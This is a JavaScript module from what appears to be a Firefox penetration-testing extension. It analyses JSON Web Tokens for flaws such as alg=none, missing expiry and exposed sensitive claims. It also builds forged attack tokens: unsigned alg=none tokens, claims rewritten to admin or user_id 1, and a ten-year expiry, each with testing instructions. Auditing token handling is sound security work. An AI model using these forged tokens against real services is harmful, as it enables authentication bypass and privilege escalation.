/**
 * JWTAnalyzer.js - Analyse avancée des vulnérabilités JWT
 * PentestHAR v2.1.0
 *
 * Détecte les vulnérabilités JWT :
 * - Algorithm None (bypass signature)
 * - Algorithm Confusion (RS256 → HS256)
 * - Absence d'expiration
 * - Expiration trop longue
 * - Claims sensibles exposés
 * - Signatures faibles
 * - Génération de variantes d'attaque
 */

class JWTAnalyzer {
  constructor() {
    // Algorithmes considérés comme faibles ou dangereux
    this.weakAlgorithms = ['none', 'None', 'NONE', 'nOnE'];
    this.symmetricAlgorithms = ['HS256', 'HS384', 'HS512'];
    this.asymmetricAlgorithms = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];

    // Claims sensibles qui ne devraient pas être dans un JWT
    this.sensitiveClaims = [
      'password', 'passwd', 'pwd', 'pass',
      'secret', 'api_key', 'apikey', 'api_secret',
      'private_key', 'privatekey', 'priv_key',
      'ssn', 'social_security',
      'credit_card', 'creditcard', 'card_number',
      'cvv', 'cvc', 'pin',
      'bank_account', 'account_number',
      'token', 'refresh_token', 'access_token' // tokens imbriqués
    ];

    // Claims d'identité à surveiller
    this.identityClaims = ['sub', 'user_id', 'uid', 'username', 'email', 'user', 'admin', 'role', 'roles', 'permissions', 'scope'];

    // Durée maximale recommandée pour un JWT (en secondes)
    this.maxRecommendedExpiry = 24 * 60 * 60; // 24 heures
    this.warnExpiry = 7 * 24 * 60 * 60; // 7 jours - avertissement
  }

  /**
   * Analyse complète d'un JWT
   * @param {string} token - Le JWT à analyser
   * @returns {Object} Résultat de l'analyse
   */
  analyze(token) {
    const result = {
      isValid: false,
      decoded: null,
      vulnerabilities: [],
      warnings: [],
      info: [],
      attackVariants: []
    };

    // Décoder le JWT
    const decoded = this.decode(token);
    if (!decoded) {
      result.warnings.push({
        type: 'decode_error',
        message: 'Impossible de décoder le JWT'
      });
      return result;
    }

    result.isValid = true;
    result.decoded = decoded;

    // Analyser les vulnérabilités
    this.checkAlgorithm(decoded, result);
    this.checkExpiration(decoded, result);
    this.checkSensitiveClaims(decoded, result);
    this.checkIdentityClaims(decoded, result);
    this.checkSignature(decoded, token, result);

    // Générer les variantes d'attaque
    result.attackVariants = this.generateAttackVariants(token, decoded);

    return result;
  }

  /**
   * Décode un JWT sans vérification de signature
   * @param {string} token - Le JWT
   * @returns {Object|null} JWT décodé ou null
   */
  decode(token) {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return null;

      const header = JSON.parse(this.base64UrlDecode(parts[0]));
      const payload = JSON.parse(this.base64UrlDecode(parts[1]));
      const signature = parts[2];

      return {
        header,
        payload,
        signature,
        raw: {
          header: parts[0],
          payload: parts[1],
          signature: parts[2]
        }
      };
    } catch (e) {
      return null;
    }
  }

  /**
   * Décode base64url
   */
  base64UrlDecode(str) {
    // Remplacer les caractères base64url par base64
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    // Ajouter le padding
    while (str.length % 4) {
      str += '=';
    }
    return atob(str);
  }

  /**
   * Encode en base64url
   */
  base64UrlEncode(str) {
    return btoa(str)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  /**
   * Vérifie l'algorithme du JWT
   */
  checkAlgorithm(decoded, result) {
    const alg = decoded.header.alg;

    // Algorithm None
    if (!alg || this.weakAlgorithms.includes(alg)) {
      result.vulnerabilities.push({
        type: 'alg_none',
        severity: 'critical',
        title: 'Algorithme "none" détecté',
        description: 'Le JWT utilise l\'algorithme "none", permettant un bypass complet de la signature',
        recommendation: 'Configurer le serveur pour rejeter l\'algorithme "none"',
        cwe: 'CWE-327'
      });
    }

    // Algorithme symétrique (potentiel brute-force)
    if (this.symmetricAlgorithms.includes(alg)) {
      result.warnings.push({
        type: 'symmetric_algorithm',
        severity: 'medium',
        title: 'Algorithme symétrique utilisé',
        description: `L'algorithme ${alg} utilise une clé secrète partagée. Si la clé est faible, elle peut être brute-forcée`,
        recommendation: 'Utiliser une clé secrète d\'au moins 256 bits, ou passer à un algorithme asymétrique',
        cwe: 'CWE-326'
      });
    }

    // Algorithme asymétrique (potentiel confusion attack)
    if (this.asymmetricAlgorithms.includes(alg)) {
      result.info.push({
        type: 'asymmetric_algorithm',
        title: `Algorithme asymétrique: ${alg}`,
        description: 'Tester une attaque de confusion d\'algorithme (RS256 → HS256) si la clé publique est accessible'
      });
    }
  }

  /**
   * Vérifie l'expiration du JWT
   */
  checkExpiration(decoded, result) {
    const now = Math.floor(Date.now() / 1000);
    const payload = decoded.payload;

    // Pas de claim exp
    if (!payload.exp) {
      result.vulnerabilities.push({
        type: 'no_expiration',
        severity: 'medium',
        title: 'JWT sans expiration',
        description: 'Le JWT n\'a pas de claim "exp" - il n\'expire jamais',
        recommendation: 'Toujours définir une expiration sur les JWT',
        cwe: 'CWE-613'
      });
    } else {
      const expDate = new Date(payload.exp * 1000);
      const expiresIn = payload.exp - now;

      // JWT déjà expiré
      if (expiresIn < 0) {
        result.info.push({
          type: 'expired',
          title: 'JWT expiré',
          description: `Le JWT a expiré le ${expDate.toISOString()}`,
          expiredSince: Math.abs(expiresIn)
        });
      } else {
        // Expiration trop longue
        if (expiresIn > this.warnExpiry) {
          result.vulnerabilities.push({
            type: 'long_expiration',
            severity: 'low',
            title: 'Expiration trop longue',
            description: `Le JWT expire dans ${Math.floor(expiresIn / 86400)} jours`,
            recommendation: 'Réduire la durée de validité du JWT (recommandé: < 24h)',
            expiresAt: expDate.toISOString()
          });
        }

        result.info.push({
          type: 'expiration',
          title: 'Expiration',
          description: `Expire le ${expDate.toISOString()}`,
          expiresIn: expiresIn,
          expiresInHuman: this.humanizeDuration(expiresIn)
        });
      }
    }

    // Vérifier iat (issued at)
    if (payload.iat) {
      const iatDate = new Date(payload.iat * 1000);
      result.info.push({
        type: 'issued_at',
        title: 'Émis le',
        description: iatDate.toISOString()
      });

      // JWT émis dans le futur (suspicieux)
      if (payload.iat > now + 60) { // 60s de tolérance
        result.warnings.push({
          type: 'future_iat',
          severity: 'low',
          title: 'JWT émis dans le futur',
          description: 'Le claim "iat" indique une date future - possible manipulation'
        });
      }
    }

    // Vérifier nbf (not before)
    if (payload.nbf) {
      const nbfDate = new Date(payload.nbf * 1000);
      if (payload.nbf > now) {
        result.info.push({
          type: 'not_yet_valid',
          title: 'JWT pas encore valide',
          description: `Valide à partir de ${nbfDate.toISOString()}`
        });
      }
    }
  }

  /**
   * Vérifie les claims sensibles
   */
  checkSensitiveClaims(decoded, result) {
    const payload = decoded.payload;

    for (const claim of this.sensitiveClaims) {
      // Vérifier les clés exactes et les variantes
      for (const key of Object.keys(payload)) {
        if (key.toLowerCase().includes(claim.toLowerCase())) {
          result.vulnerabilities.push({
            type: 'sensitive_claim',
            severity: 'high',
            title: `Claim sensible exposé: ${key}`,
            description: `Le JWT contient un claim potentiellement sensible: "${key}"`,
            value: this.maskValue(payload[key]),
            recommendation: 'Ne jamais inclure de données sensibles dans un JWT (visible en base64)',
            cwe: 'CWE-200'
          });
        }
      }
    }
  }

  /**
   * Vérifie les claims d'identité
   */
  checkIdentityClaims(decoded, result) {
    const payload = decoded.payload;

    for (const claim of this.identityClaims) {
      if (payload[claim] !== undefined) {
        const value = payload[claim];

        result.info.push({
          type: 'identity_claim',
          claim: claim,
          value: typeof value === 'object' ? JSON.stringify(value) : value
        });

        // Vérifier les rôles admin/privilégiés
        if (['admin', 'role', 'roles', 'permissions', 'scope'].includes(claim)) {
          const valueStr = JSON.stringify(value).toLowerCase();
          if (valueStr.includes('admin') || valueStr.includes('root') || valueStr.includes('superuser')) {
            result.warnings.push({
              type: 'privileged_role',
              severity: 'info',
              title: 'Rôle privilégié détecté',
              description: `Le JWT contient un rôle privilégié: ${claim} = ${JSON.stringify(value)}`,
              recommendation: 'Vérifier si le JWT peut être modifié pour élever les privilèges'
            });
          }
        }
      }
    }
  }

  /**
   * Analyse la signature
   */
  checkSignature(decoded, token, result) {
    // Signature vide
    if (!decoded.signature || decoded.signature.length === 0) {
      result.vulnerabilities.push({
        type: 'empty_signature',
        severity: 'critical',
        title: 'Signature vide',
        description: 'Le JWT n\'a pas de signature - probablement alg=none',
        cwe: 'CWE-347'
      });
    }

    // Signature très courte (suspicieuse)
    if (decoded.signature && decoded.signature.length < 10) {
      result.warnings.push({
        type: 'short_signature',
        severity: 'medium',
        title: 'Signature suspicieusement courte',
        description: `La signature ne fait que ${decoded.signature.length} caractères`
      });
    }
  }

  /**
   * Génère des variantes d'attaque
   */
  generateAttackVariants(token, decoded) {
    const variants = [];

    // 1. Algorithm None attack
    const noneToken = this.createAlgNoneToken(decoded);
    variants.push({
      name: 'Algorithm None',
      description: 'JWT avec alg=none et signature vide',
      token: noneToken,
      howToTest: 'Remplacer le JWT original par cette variante et vérifier si le serveur l\'accepte'
    });

    // 2. Token sans signature
    const unsignedToken = `${decoded.raw.header}.${decoded.raw.payload}.`;
    variants.push({
      name: 'Signature vide',
      description: 'JWT original avec signature supprimée',
      token: unsignedToken,
      howToTest: 'Tester si le serveur accepte un JWT sans signature'
    });

    // 3. Claims modifiés (si identité trouvée)
    const modifiedClaims = this.createModifiedClaimsToken(decoded);
    if (modifiedClaims) {
      variants.push({
        name: 'Claims modifiés',
        description: 'JWT avec claims d\'identité modifiés (admin, user_id, etc.)',
        token: modifiedClaims.token,
        changes: modifiedClaims.changes,
        howToTest: 'Tester avec alg=none ou si la clé secrète est connue'
      });
    }

    // 4. Expiration dans le futur
    const futureExpToken = this.createFutureExpToken(decoded);
    variants.push({
      name: 'Expiration étendue',
      description: 'JWT avec expiration dans 10 ans',
      token: futureExpToken,
      howToTest: 'Tester avec alg=none pour vérifier si l\'expiration est validée'
    });

    return variants;
  }

  /**
   * Crée un token avec alg=none
   */
  createAlgNoneToken(decoded) {
    const newHeader = { ...decoded.header, alg: 'none' };
    const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
    const payloadB64 = decoded.raw.payload;
    return `${headerB64}.${payloadB64}.`;
  }

  /**
   * Crée un token avec claims modifiés
   */
  createModifiedClaimsToken(decoded) {
    const payload = { ...decoded.payload };
    const changes = [];

    // Modifier les claims d'identité
    if (payload.sub) {
      payload.sub = 'admin';
      changes.push('sub: admin');
    }
    if (payload.user_id !== undefined) {
      payload.user_id = 1;
      changes.push('user_id: 1');
    }
    if (payload.uid !== undefined) {
      payload.uid = 1;
      changes.push('uid: 1');
    }
    if (payload.admin !== undefined) {
      payload.admin = true;
      changes.push('admin: true');
    }
    if (payload.role !== undefined) {
      payload.role = 'admin';
      changes.push('role: admin');
    }
    if (payload.roles !== undefined) {
      payload.roles = ['admin'];
      changes.push('roles: ["admin"]');
    }

    if (changes.length === 0) return null;

    // Créer avec alg=none
    const newHeader = { ...decoded.header, alg: 'none' };
    const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
    const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));

    return {
      token: `${headerB64}.${payloadB64}.`,
      changes
    };
  }

  /**
   * Crée un token avec expiration dans le futur
   */
  createFutureExpToken(decoded) {
    const payload = { ...decoded.payload };
    payload.exp = Math.floor(Date.now() / 1000) + (10 * 365 * 24 * 60 * 60); // +10 ans

    const newHeader = { ...decoded.header, alg: 'none' };
    const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
    const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));

    return `${headerB64}.${payloadB64}.`;
  }

  /**
   * Masque une valeur sensible
   */
  maskValue(value) {
    if (typeof value !== 'string') {
      return typeof value;
    }
    if (value.length <= 4) {
      return '****';
    }
    return value.substring(0, 2) + '****' + value.substring(value.length - 2);
  }

  /**
   * Convertit une durée en format humain
   */
  humanizeDuration(seconds) {
    if (seconds < 60) return `${seconds} secondes`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)} minutes`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)} heures`;
    return `${Math.floor(seconds / 86400)} jours`;
  }

  /**
   * Résumé pour affichage
   */
  getSummary(analysis) {
    return {
      algorithm: analysis.decoded?.header?.alg || 'Unknown',
      hasVulnerabilities: analysis.vulnerabilities.length > 0,
      criticalCount: analysis.vulnerabilities.filter(v => v.severity === 'critical').length,
      highCount: analysis.vulnerabilities.filter(v => v.severity === 'high').length,
      warningsCount: analysis.warnings.length,
      expiration: analysis.decoded?.payload?.exp
        ? new Date(analysis.decoded.payload.exp * 1000).toISOString()
        : 'Aucune'
    };
  }
}

// Export global pour Firefox extension
if (typeof window !== 'undefined') {
  window.JWTAnalyzer = JWTAnalyzer;
}

// Export pour Node.js (tests)
if (typeof module !== 'undefined' && module.exports) {
  module.exports = JWTAnalyzer;
}
